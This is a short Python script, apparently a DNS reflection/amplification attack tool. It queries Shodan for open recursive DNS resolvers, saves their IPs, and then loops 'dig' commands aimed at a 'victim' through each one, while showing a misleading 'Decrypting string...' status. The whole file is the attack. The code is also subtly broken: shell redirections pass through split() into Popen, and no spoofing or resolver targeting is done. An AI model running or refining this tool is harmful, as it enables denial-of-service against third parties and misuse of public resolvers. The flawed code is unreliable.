import typer
import re
import subprocess
from rich.console import Console
from time import sleep

def subprocess_call_commands(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()


console = Console() 


def main(api_key: str,victim:str):
    #Initialize
    initCommand = "shodan init " + api_key + "> /dev/null 2>&1"
    subprocess_call_commands(initCommand)

    #Search DNS Resolvers through Shodan API
    searchCommand = 'shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1'
    subprocess_call_commands(searchCommand)

    parseIPCommand = 'shodan parse --fields ip_str DNS-Resolvers.json.gz > /dev/null 2>&1 > DNS-Resolvers.txt'
    subprocess_call_commands(parseIPCommand)

    #Delete DNS-Resolvers.json.gz
    subprocess_call_commands("rm DNS-Resolvers.json.gz")

    with console.status("[bold green]Decrypting string...[/bold green]"):
        sleep(1)
        with open('DNS-Resolvers.txt') as f:
            contents = f.readlines()
            for i in contents:
                attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
                subprocess_call_commands(attackCommand)






if __name__ == "__main__":
    typer.run(main)